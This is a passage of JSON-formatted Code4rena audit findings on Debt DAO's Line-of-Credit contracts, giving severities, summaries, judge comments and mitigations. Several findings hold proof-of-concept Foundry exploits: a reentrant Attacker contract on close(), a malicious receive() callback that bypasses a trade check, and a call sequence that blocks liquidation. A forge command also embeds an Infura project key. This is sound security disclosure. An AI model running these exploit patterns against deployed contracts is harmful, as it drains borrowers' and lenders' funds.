\"forge-std/Test.sol\";\nimport { Denominations } from \"chainlink/Denominations.sol\";\nimport { Address } from \"openzeppelin/utils/Address.sol\";\n\nimport { Spigot } from \"../modules/spigot/Spigot.sol\";\nimport { Escrow } from \"../modules/escrow/Escrow.sol\";\nimport { SecuredLine } from \"../modules/credit/SecuredLine.sol\";\nimport { ILineOfCredit } from \"../interfaces/ILineOfCredit.sol\";\nimport { ISecuredLine } from \"../interfaces/ISecuredLine.sol\";\n\nimport { LineLib } from \"../utils/LineLib.sol\";\nimport { MutualConsent } from \"../utils/MutualConsent.sol\";\n\nimport { MockLine } from \"../mock/MockLine.sol\";\nimport { SimpleOracle } from \"../mock/SimpleOracle.sol\";\nimport { RevenueToken } from \"../mock/RevenueToken.sol\";\n\n\ninterface IHook {\n    function tokensReceived(\n        address from,\n        address to,\n        uint256 amount\n    ) external;\n}\n\ncontract RevenueTokenWithHook is RevenueToken {\n    using Address for address;\n    mapping(address => bool) public registry;\n\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual override {\n        super._afterTokenTransfer(from, to, amount);\n        if (registry[to]) {\n            IHook(to).tokensReceived(from, to, amount);\n        }\n    }\n\n    function registerHook(address addr) external {\n        registry[addr] = true;\n    }\n}\n\ncontract Attacker is IHook {\n    uint256 constant ATTACK_COUNT = 10;\n    SecuredLine line;\n    address borrower;\n    RevenueTokenWithHook token;\n    uint256 count;\n    bool attackEnable;\n    constructor(address line_, address borrower_, address token_) {\n        line = SecuredLine(payable(line_));\n        borrower = borrower_;\n        token = RevenueTokenWithHook(token_);\n        token.registerHook(address(this));\n    }\n    function tokensReceived(\n            address,\n            address,\n            uint256\n        ) external {\n        if (msg.sender != address(token)) return;\n        if (!attackEnable) return;\n        uint256 count_ = count;\n        if (count_ >= ATTACK_COUNT) return;\n        count = count_ + 1;\n        bytes32 id = line.ids(0);\n        (uint256 deposit,,,,,,) = line.credits(id);\n        token.transfer(address(line), deposit);\n        line.close(id);\n    }\n\n    function enableAttack() external {\n        attackEnable = true;\n    }\n}\n\n\ncontract ExploitCloseFunctionTest is Test {\n    uint256 constant ONE_YEAR = 365.25 days;\n    uint256 constant ATTACK_COUNT = 10;\n    Escrow escrow;\n    Spigot spigot;\n    RevenueTokenWithHook supportedToken1;\n    RevenueToken supportedToken2;\n    RevenueToken unsupportedToken;\n    SimpleOracle oracle;\n    SecuredLine line;\n    uint mintAmount = 100 ether;\n    uint MAX_INT = 115792089237316195423570985008687907853269984665640564039457584007913129639935;\n    uint32 minCollateralRatio = 10000; // 100%\n    uint128 dRate = 100;\n    uint128 fRate = 1;\n    uint ttl = ONE_YEAR;\n\n    address borrower;\n    address arbiter;\n    address lender;\n\n    function setUp() public {\n        borrower = address(20);\n        arbiter = address(this);\n        supportedToken1 = new RevenueTokenWithHook();\n        supportedToken2 = new RevenueToken();\n        unsupportedToken = new RevenueToken();\n\n        spigot = new Spigot(arbiter, borrower, borrower);\n        oracle = new SimpleOracle(address(supportedToken1), address(supportedToken2));\n\n        escrow = new Escrow(minCollateralRatio, address(oracle), arbiter, borrower);\n\n        line = new SecuredLine(\n          address(oracle),\n          arbiter,\n          borrower,\n          payable(address(0)),\n          address(spigot),\n          address(escrow),\n          ONE_YEAR,\n          0\n        );\n        lender = address(new Attacker(address(line), borrower, address(supportedToken1)));\n        assertEq(supportedToken1.registry(lender), true);\n        \n        escrow.updateLine(address(line));\n        spigot.updateOwner(address(line));\n        \n        assertEq(uint(line.init()), uint(LineLib.STATUS.ACTIVE));\n\n        _mintAndApprove();\n        escrow.enableCollateral( address(supportedToken1));\n        escrow.enableCollateral( address(supportedToken2));\n   \n        vm.startPrank(borrower);\n        escrow.addCollateral(1 ether, address(supportedToken2));\n        vm.stopPrank();\n    }\n\n    function testExpoit() public {\n        _addCredit(address(supportedToken1), 1 ether);\n        bytes32 id = line.ids(0);\n        vm.warp(line.deadline() - ttl / 2);\n        line.accrueInterest();\n        (uint256 deposit, , uint256 interestAccrued, , , , ) = line.credits(id);\n        uint256 lenderBalanceBefore = supportedToken1.balanceOf(lender);\n        uint256 lenderBalanceAfterExpected = lenderBalanceBefore + deposit + interestAccrued;\n\n        Attacker(lender).enableAttack();\n        hoax(lender);\n        line.close(id);\n        vm.stopPrank();\n        uint256 lenderBalanceAfter = supportedToken1.balanceOf(lender);\n        assertEq(lenderBalanceAfter, lenderBalanceAfterExpected + interestAccrued * ATTACK_COUNT);\n        (uint256 count,) = line.counts();\n        assertEq(count, MAX_INT - ATTACK_COUNT + 1);\n    }\n\n\n    function _mintAndApprove() internal {\n        deal(lender, mintAmount);\n\n        supportedToken1.mint(borrower, mintAmount);\n        supportedToken1.mint(lender, mintAmount);\n        supportedToken2.mint(borrower, mintAmount);\n        supportedToken2.mint(lender, mintAmount);\n        unsupportedToken.mint(borrower, mintAmount);\n        unsupportedToken.mint(lender, mintAmount);\n\n        vm.startPrank(borrower);\n        supportedToken1.approve(address(escrow), MAX_INT);\n        supportedToken1.approve(address(line), MAX_INT);\n        supportedToken2.approve(address(escrow), MAX_INT);\n        supportedToken2.approve(address(line), MAX_INT);\n        unsupportedToken.approve(address(escrow), MAX_INT);\n        unsupportedToken.approve(address(line), MAX_INT);\n        vm.stopPrank();\n\n        vm.startPrank(lender);\n        supportedToken1.approve(address(escrow), MAX_INT);\n        supportedToken1.approve(address(line), MAX_INT);\n        supportedToken2.approve(address(escrow), MAX_INT);\n        supportedToken2.approve(address(line), MAX_INT);\n        unsupportedToken.approve(address(escrow), MAX_INT);\n        unsupportedToken.approve(address(line), MAX_INT);\n        vm.stopPrank();\n\n    }\n\n    function _addCredit(address token, uint256 amount) public {\n        hoax(borrower);\n        line.addCredit(dRate, fRate, amount, token, lender);\n        vm.stopPrank();\n        hoax(lender);\n        line.addCredit(dRate, fRate, amount, token, lender);\n        vm.stopPrank();\n    }\n\n    receive() external payable {}\n}\n\n```\n\nRelated links:\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L488>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L173>\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nAdd reentrancy protection on `close()` function.\n\n**[dmvt (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/176#issuecomment-1318478806):**\n > Has external requirements making the report Medium risk, not High.\n\n**[kibagateaux (Debt DAO) commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/176#issuecomment-1332386899):**\n > Could be marked as \"Acknowledged\". At the end of the day Borrowers and Lenders agree to which tokens to use, Debt DAO has no part in decision.\n> \n> In my opinion it's not valid to say \"If you add malicious things, malicious things happen\". If I didn't want token reentrancy attacks, I simply wouldn't add tokens with explicit arbitrary reentrancy abilities. \n\n**[dmvt (judge) commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/176#issuecomment-1340035461):**\n > I think the sponsor misunderstands something fundamental about the way reentrancy attacks happen. The token itself isn't malicious. It's the external calls the token makes as part of its normal interaction that _can be made_, but are not necessarily, malicious. Issue stands.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the Line of Credit smart contract, specifically in the `_close()` function. This vulnerability allows a lender to exploit the credit token, such as an ERC777 token, to withdraw extra tokens from the borrower's account. This also causes the `count` state variable to underflow, preventing the borrower from repaying the loan and retrieving their collateral. A proof of concept is provided in the form of a testcase that exploits this vulnerability. The recommended mitigation step is to add reentrancy protection on the `close()` function. The tools used for this report were VS Code. The severity of this vulnerability is Medium, as it requires external requirements to be met. The sponsor acknowledges the vulnerability, but states that it is not valid to say \"if you add malicious things, malicious things happen.\" However, the judge believes that the sponsor misunderstands the way reentrancy attacks work and the issue still stands.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/176",
      "tags": [],
      "finders": [
        "adriro",
        "KingNFT",
        "Ch\\_301",
        "\\_\\_141345\\_\\_"
      ]
    },
    {
      "id": "42941",
      "title": "[M-04] Lender can trade claimToken in a malicious way to steal the borrower's money via `claimAndRepay()` in SpigotedLine by using malicious zeroExTradeData",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/SpigotedLine.sol#L106-L112>\n\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotedLineLib.sol#L75-L85>\n\n### Impact\n\nLender can trade claimToken in a malicious way to steal the borrower's money via `claimAndRepay()` in SpigotedLine by using malicious zeroExTradeData.\n\nIn the design of the protocol, the lender can use the function `claimAndRepay()`, the lender can take claimToken by spigot.claimEscrow and then trade the claimToken to the CreditTOken via ZeroEx exchange, then repay the credit.\n\n```\nfunction claimAndRepay(address claimToken, bytes calldata zeroExTradeData) external\n        whileBorrowing\n        nonReentrant\n        returns (uint256) { \n\n...\n// Line 106 - Line 112\nuint256 newTokens = claimToken == credit.token ?\n          spigot.claimEscrow(claimToken) :  // same asset. dont trade\n          _claimAndTrade(                   // trade revenue token for debt obligation\n              claimToken,\n              credit.token,\n              zeroExTradeData\n          );\n...\n// Line 128 - Line 130 \n credits[id] = _repay(credit, id, repaid);\n\n        emit RevenuePayment(claimToken, repaid);\n\n...\n\n}\n\n```\n\n    function _claimAndTrade(\n          address claimToken,\n          address targetToken,\n          bytes calldata zeroExTradeData\n        )\n            internal\n            returns (uint256)\n        {\n            (uint256 tokensBought, uint256 totalUnused) = SpigotedLineLib.claimAndTrade(\n                claimToken,\n                targetToken,\n                swapTarget,\n                address(spigot),\n                unusedTokens[claimToken],\n                zeroExTradeData\n            );\n\n            // we dont use revenue after this so can store now\n            unusedTokens[claimToken] = totalUnused;\n            return tokensBought;\n        }\n\n```\nfunction claimAndTrade(\n        address claimToken,\n        address targetToken,\n        address payable swapTarget,\n        address spigot,\n        uint256 unused,\n        bytes calldata zeroExTradeData\n    )\n    external \n        returns(uint256, uint256)\n\n{\n...\n trade(\n            claimed + unused,\n            claimToken,\n            swapTarget,\n            zeroExTradeData\n        );\n        \n        // underflow revert ensures we have more tokens than we started with\n        uint256 tokensBought = LineLib.getBalance(targetToken) - oldTargetTokens;\n\n        if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought\n...\n\n\n}\n\n```\n\nIn the function to claimAndTrade in SpigotedLineLib.sol, the check in line 85 to check if tokenBought is not equal to 0 then revert.\n\nThe bug here is the zeroExTradeData is controlled by the lender and can be malicious and can manipulate the flow to bypass the check in line 85.\n\n### Proof of Concept\n\nThe following code can manipulate and bypass the check to steal money of the borrower.\n\nStep 1: Construct the zeroExTradeData data to sell the claimToken to ETH via the ZeroEx exchange data. The lender constructs the zeroExTradeData to send ETH to the exploit contract.\n\nStep 2: In the exploit contract, have the `receive()` function to receive ETH from ZeroEx exchange. Since the exchange was from claimToken to ETH, so the exploit contract will receive the ETH and the code in receive function will be hit.\n\n```\nreceive() external payable {\n    console.log(\"Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance\");\n    uint256 amount = 100; \n    creditToken.transfer(address(line),amount);\n    console.log(\"Receive the amount of ETH: %s\", msg.value);\n  }\n\n```\n\nIn the `receive()` function, the exploit contract transfers some amount of creditToken to the SpigotedLine contract to bypass the check:\n\n     if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought\n\nSince this check requires only not 0, so the lender can send only 1 or very small amount, e.g. 100 of creditToken.\n\nThis amount then will be used to repay the credit.\n\nSo this means, the borrower lost money, because the lender can claim big amount of claimToken and repay a little for the credit.\n\nIn the zip file in the Google_Drive link, there is the POC written for this bug.\n\nThe test case is test_lender_can_claim_and_repay\\_3 in file SpigotedLine.t.modified.sol\n\nYou can put this file to the tests folder\n<https://drive.google.com/file/d/1IWAV8Zz5KVgw22-gnVZrOxkcYrgv8cO2/view?usp=sharing>\n\nYou can run the POC by calling:\n\n    forge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url 'https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af' --fork-block-n\n    umber 15918000\n\nHere I use the block-number to make the test log stable, but this does not impact the logic of POC.\n\nYou can find the detailed log file: Line-of-Credit\\test_claim\\_221107\\_2311.log.\n\nThe full log file here: <https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing>\n\nIn this log file, the lender claims 1000 DAI (DAI is revenueToken) then sell to receive 0.6324 ETH, but repays only 100 &ast; ( 10 &ast;&ast; -18 ) BUSD for the borrower.\n\nLogs:\n\nStep 0: As a Borrower borrow some money\n\nStep 1: Construct the tradeData to call claimAndRepay as the lender\nclaimed: 1000000000000000000000\n\nunused: 0\n\nsellAmount: 1000000000000000000000\n\nStep 1: As the lender, call claimAndRepay with Malicious zeroExTradeData\n\nCallback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance\n\nReceive the amount of ETH: 632428006785336734\nemit RepayInterest(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 0)\n\nemit RepayPrincipal(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 100)\n\nRevenuePayment(token: DAI: \\[0x6b175474e89094c44da98b954eedeac495271d0f], amount: 100)\n\nYou can use the POC.patch here: <https://drive.google.com/file/d/17Ycdi5czBoFOKNQlgVqWxVdHxfw04304/view?usp=sharing>\n\nTo use it use command\n\n```\ngit apply POC.patch\n\n```\n\nTo run use command\n\n```\nforge install\nforge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url 'https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af' --fork-block-n\number 15918000\n\n```\n\nThe full code repository: <https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing>\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nThis is a difficult bug to fix if the protocol still allows the lender to use this functionality. Probably should limit this functionality for the borrower to use. Because the borrower will not benefit from stealing his own money.\n\n**[dmvt (judge) decreased severity to Medium](https://github.com/code-423n4/2022-11-debtdao-findings/issues/110)**\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/110#issuecomment-1343293968):**\n > A note on this. [#411](https://github.com/code-423n4/2022-11-debtdao-findings/issues/411) describes a different vector of the same fundamental attack. It's likely that the vector in #411 is more likely to occur, but I'm marking this one the best due to the inclusion of a test and descriptive POC. For the final report it should be noted that both the lender and borrower can perform a version of this attack.\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/110#issuecomment-1405075073)**\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a vulnerability in the SpigotedLine contract of the Line of Credit project. This vulnerability allows a lender to trade claimToken in a malicious way to steal the borrower's money. The lender can use the function `claimAndRepay()` to take claimToken and trade it to the CreditToken via ZeroEx exchange, then repay the credit. The bug is in the function `claimAndTrade()` in the SpigotedLineLib.sol file, where the check to ensure tokens are bought is bypassed by the malicious zeroExTradeData controlled by the lender. A proof of concept code is provided that shows how the lender can manipulate the flow to bypass the check and steal the borrower's money. The recommended mitigation is to limit this functionality for the borrower to use, as they will not benefit from stealing their own money.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/110",
      "tags": [],
      "finders": [
        "Trust",
        "0x52",
        "cccz",
        "minhquanym",
        "perseverancesuccess",
        "Lambda",
        "HE1M",
        "adriro",
        "aphak5010"
      ]
    },
    {
      "id": "42940",
      "title": "[H-05] Borrower can craft a borrow that cannot be liquidated, even by arbiter.",
      "impact": "HIGH",
      "content": "\nLineOfCredit manages an array of open credit line identifiers called `ids`. Many interactions with the Line operate on ids\\[0], which is presumed to be the oldest borrow which has non zero principal. For example, borrowers must first deposit and repay to ids\\[0] before other credit lines. \n\nThe list is managed by several functions:\n\n1.  CreditListLib.removePosition - deletes parameter id in the ids array\n2.  CreditListLib.stepQ - rotates all ids members one to the left, with the leftmost becoming the last element\n3.  \\_sortIntoQ - most complex function, finds the smallest index which can swap identifiers with the parameter id, which satisfies the conditions:\n    1.  target index is not empty\n    2.  there is no principal owed for the target index's credit\n\nThe idea I had is that if we could corrupt the ids array so that ids\\[0] would be zero, but after it there would be some other active borrows, it would be a very severe situation. The whileBorrowing() modifier assumes if the first element has no principal, borrower is not borrowing. \n\n    modifier whileBorrowing() {\n        if(count == 0 || credits[ids[0]].principal == 0) { revert NotBorrowing(); }\n        _;\n    }\n\nIt turns out there is a simple sequence of calls which allows borrowing while ids\\[0] is deleted, and does not re-arrange the new borrow into ids\\[0]!\n\n1.  id1 = `addCredit()` - add a new credit line, a new id is pushed to the end of ids array.\n2.  id2 = `addCredit()` - called again, ids.length = 2\n3.  close(id1) - calls `removePosition()` on id1, now ids array is \\[0x000000000000000000000000, id2 ]\n4.  borrow(id2) - will borrow from id2 and call `\\_sortIntoQ`. The sorting loop will not find another index other than id2's existing index (`id == bytes32(0)` is true).\n\nFrom this sequence, we achieve a borrow while ids\\[0] is 0! Therefore, credits\\[ids\\[0]].principal = credits\\[0].principal = 0, and whileBorrowing() reverts.\n\nThe impact is massive - the following functions are disabled:\n\n*   `SecureLine::liquidate()`\n*   `LineOfCredit::depositAndClose()`\n*   `LineOfCredit::depositAndRepay()`\n*   `LineOfCredit::claimAndRepay()`\n*   `LineOfCredit::claimAndTrade()`\n\n### Impact\n\nBorrower can craft a borrow that cannot be liquidated, even by arbiter. Alternatively, functionality may be completely impaired through no fault of users.\n\n### Proof of Concept\n\nCopy the following code into LineOfCredit.t.sol\n\n    function _addCreditLender2(address token, uint256 amount) public {\n        // Prepare lender 2 operations, does same as mintAndApprove()\n        address lender2 = address(21);\n        deal(lender2, mintAmount);\n        supportedToken1.mint(lender2, mintAmount);\n        supportedToken2.mint(lender2, mintAmount);\n        unsupportedToken.mint(lender2, mintAmount);\n        vm.startPrank(lender2);\n        supportedToken1.approve(address(line), MAX_INT);\n        supportedToken2.approve(address(line), MAX_INT);\n        unsupportedToken.approve(address(line), MAX_INT);\n        vm.stopPrank();\n        // addCredit logic\n        vm.prank(borrower);\n        line.addCredit(dRate, fRate, amount, token, lender2);\n        vm.stopPrank();\n        vm.prank(lender2);\n        line.addCredit(dRate, fRate, amount, token, lender2);\n        vm.stopPrank();\n    }\n    function test_attackUnliquidatable() public {\n        bytes32 id_1;\n        bytes32 id_2;\n        _addCredit(address(supportedToken1), 1 ether);\n        _addCreditLender2(address(supportedToken1), 1 ether);\n        id_1 =  line.ids(0);\n        id_2 =  line.ids(1);\n        hoax(borrower);\n        line.close(id_1);\n        hoax(borrower);\n        line.borrow(id_2, 1 ether);\n        id_1 =  line.ids(0);\n        id_2 = line.ids(1);\n        console.log(\"id1 : \", uint256(id_1));\n        console.log(\"id2 : \", uint256(id_2));\n        vm.warp(ttl+1);\n        assert(line.healthcheck() == LineLib.STATUS.LIQUIDATABLE);\n        vm.expectRevert(ILineOfCredit.NotBorrowing.selector);\n        bool isSolvent = line.declareInsolvent();\n    }\n\n### Recommended Mitigation Steps\n\nWhen sorting new borrows into the ids queue, do not skip any elements.\n\n**[dmvt (judge) marked as nullified](https://github.com/code-423n4/2022-11-debtdao-findings/issues/421)**\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/421#issuecomment-1341256600):**\n > Unclear why this issue is nullified, I have demonstrated a POC that shows line cannot be declared insolvent.\n\n**[dmvt (judge) re-opened the issue and commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/421#issuecomment-1343253554):**\n > Kicking back to the sponsor for another look. I'm inclined to bring this one back as valid unless the sponsor can show why it isn't.\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/421#issuecomment-1405074802)**\n\n\n\n***\n\n",
      "summary": "\nThe LineOfCredit contract has a bug in its management of an array of credit line identifiers called `ids`. The contract has several functions that manage this list, including removing positions, rotating positions, and sorting new borrows into the list. \n\nThe bug allows for a borrower to craft a borrow that cannot be liquidated, even by an arbiter. This can also impair the functionality of the contract for all users. \n\nA proof of concept has been provided to demonstrate the bug, and it is recommended that when sorting new borrows into the ids list, no elements should be skipped. The issue has been marked as nullified and confirmed by the sponsor.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/421",
      "tags": [],
      "finders": [
        "Trust",
        "bin2chen"
      ]
    },
    {
      "id": "42939",
      "title": "[H-01] Call to `declareInsolvent()` would revert when contract status reaches liquidation point after repayment of credit position 1",
      "impact": "HIGH",
      "content": "\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L143>\n\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L83-L86>\n\n### Impact\n\nThe modifier `whileBorrowing()` is used along in the call to LineOfCredit.declareInsolvent(). However this check reverts when count == 0 or `credits[ids[0]].principal == 0` . Within the contract, any lender can add credit which adds an entry in credits array, credits\\[ids].\n\nAssume, when borrower chooses lender positions including credits\\[ids\\[0]] to draw on, and repays back the loan fully for credits\\[ids\\[1]], then the call to declareInsolvent() by the arbiter would revert since it does not pass the `whileBorrowing()` modifier check due to the ids array index shift in the call to  stepQ(), which would shift ids\\[1] to ids\\[0], thereby making the condition for `credits[ids[0]].principal == 0` be true causing the revert.\n\n### Proof of Concept\n\n1.  LineOfCredit contract is set up and 5 lenders have deposited into the contract.\n2.  Alice, the borrower borrows credit from these 5 credit positions including by calling `LineOfCredit.borrow()` for the position ids.\n3.  Later Alice pays back the loan for  credit position id 1 just before the contract gets liquidated.\n4.  At the point where `ids.stepQ()` is called in `\\_repay()`, position 1 is moved to ids\\[0]\n5.  When contract status is LIQUIDATABLE, no loan drawn on credit position 0 and arbiter calls declareInsolvent() , the call would revert since `credits[ids[0]].principal == 0`\n\n### Recommended Mitigation Steps\n\nThe modifier `whileBorrowing()` would need to be reviewed and amended.\n\n**[dmvt (judge) increased severity to High](https://github.com/code-423n4/2022-11-debtdao-findings/issues/69)**\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/69)**\n\n\n\n***\n\n",
      "summary": "\nThe bug report highlights an issue with the modifier `whileBorrowing()` in the LineOfCredit.sol contract. This modifier is used in the call to LineOfCredit.declareInsolvent(), but it can cause the call to revert in certain situations. Specifically, if a borrower repays a loan for one credit position and then an arbiter calls declareInsolvent(), the call will revert due to a shift in the ids array. This can be problematic for lenders who have deposited funds into the contract. The report recommends reviewing and amending the modifier to prevent this issue from occurring. The severity of the bug has been increased to High and has been confirmed by the team at Debt DAO.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/69",
      "tags": [],
      "finders": [
        "PaludoX0",
        "Ch\\_301",
        "cryptphi",
        "ayeslick",
        "adriro",
        "perseverancesuccess"
      ]
    },
    {
      "id": "6251",
      "title": "[M-11] Lender can reject closing a position",
      "impact": "MEDIUM",
      "content": "\nA credit line can be closed by using the `LineOfCredit.depositAndClose()` or `LineOfCredit.close`. The remaining funds deposited by the lender (`credit.deposit`) and the accumulated and paid interest are transferred to the lender.\n\nHowever, if the used credit token `credit.token` is native ETH (or an ERC-777 token with receiver hooks, and under the assumption that the oracle supports this asset in the first place), the lender can reject the closing of the credit by reverting the token transfer.\n\n### Impact\n\nThe lender can prevent the borrower from closing the credit line. This leads to the following consequences:\n\n*   Migrating (rollover) to a new line is not possible (it requires all credits to be closed, see [SecuredLine.sol#L55](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L55))\n*   Releasing a spigot and transferring ownership to the borrower is not possible (see [SpigotedLineLib.sol#L195](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L195))\n*   Sweeping remaining tokens (e.g. revenue tokens) in the Spigot to the borrower is not possible (see [SpigotedLineLib.sol#L220](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L220>))\n\n### Proof of Concept\n\n[modules/credit/LineOfCredit.sol#L489-L493](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L489-L493)\n\n```solidity\nfunction _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n    if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }\n\n    // return the Lender's funds that are being repaid\n    if (credit.deposit + credit.interestRepaid > 0) {\n        LineLib.sendOutTokenOrETH(\n            credit.token,\n            credit.lender,\n            credit.deposit + credit.interestRepaid\n        );\n    }\n\n    delete credits[id]; // gas refunds\n\n    // remove from active list\n    ids.removePosition(id);\n    unchecked { --count; }\n\n    // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.\n    if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }\n\n    emit CloseCreditPosition(id);\n\n    return true;\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider using a pull-based pattern to allow the lender to withdraw the funds instead of sending them back directly.\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/467#issuecomment-1405078929)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the LineOfCredit.sol contract, which is part of the Line-of-Credit project on Github. The vulnerability is related to the closing of a credit line, which can be done using the `LineOfCredit.depositAndClose()` or `LineOfCredit.close` functions. The remaining funds deposited by the lender (`credit.deposit`) and the accumulated and paid interest are transferred to the lender. However, if the used credit token is native ETH (or an ERC-777 token with receiver hooks, and under the assumption that the oracle supports this asset in the first place), the lender can reject the closing of the credit by reverting the token transfer. \n\nThe impact of this vulnerability is that the lender can prevent the borrower from closing the credit line. This leads to the borrower not being able to migrate (rollover) to a new line, releasing a spigot and transferring ownership to the borrower, and sweeping remaining tokens (e.g. revenue tokens) in the Spigot to the borrower. \n\nThe proof of concept for this vulnerability can be found in the LineOfCredit.sol contract, specifically in lines 489-493. The recommended mitigation steps are to consider using a pull-based pattern to allow the lender to withdraw the funds instead of sending them back directly.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/467",
      "tags": [
        "Revert Inside Hook"
      ],
      "finders": [
        "Jeiwan",
        "minhquanym",
        "berndartmueller",
        "0xdeadbeef0x",
        "ayeslick",
        "R2"
      ]
    },
    {
      "id": "6250",
      "title": "[M-10] address.call{value:x}() should be used instead of payable.transfer()",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L48\n\n\n## Vulnerability details\n\n## Impact\n\nWhen withdrawing and refund  ETH, the  contract uses Solidity’s `transfer()` function. \n\nUsing Solidity's `transfer()` function has some notable shortcomings when the withdrawer is a smart contract, which can render ETH deposits impossible to withdraw. Specifically, the withdrawal will inevitably fail when:\n* The withdrawer smart contract does not implement a payable fallback function.\n* The withdrawer smart contract implements a payable fallback function which uses more than 2300 gas units.\n* The withdrawer smart contract implements a payable fallback function which needs less than 2300 gas units but is called through a proxy that raises the call’s gas usage above 2300.\n\nRisks of reentrancy stemming from the use of this function can be mitigated by tightly following the \"Check-Effects-Interactions\" pattern and using OpenZeppelin Contract’s ReentrancyGuard contract. \n\n## Proof of Concept\n\n```solidity\n// Line-of-Credit/contracts/utils/LineLib.sol\n48:    payable(receiver).transfer(amount);\n```\n\n\n#### References:\n\nThe issues with `transfer()` are outlined [here](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/\n)\n\nFor further reference on why using Solidity’s `transfer()` is no longer recommended, refer to these [articles](https://blog.openzeppelin.com/reentrancy-after-istanbul/).\n\n\n\n## Tools Used\nManual analysis.\n\n## Recommended Mitigation Steps\n\nUsing low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin `Address.sendValue` is advised, [reference](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60).",
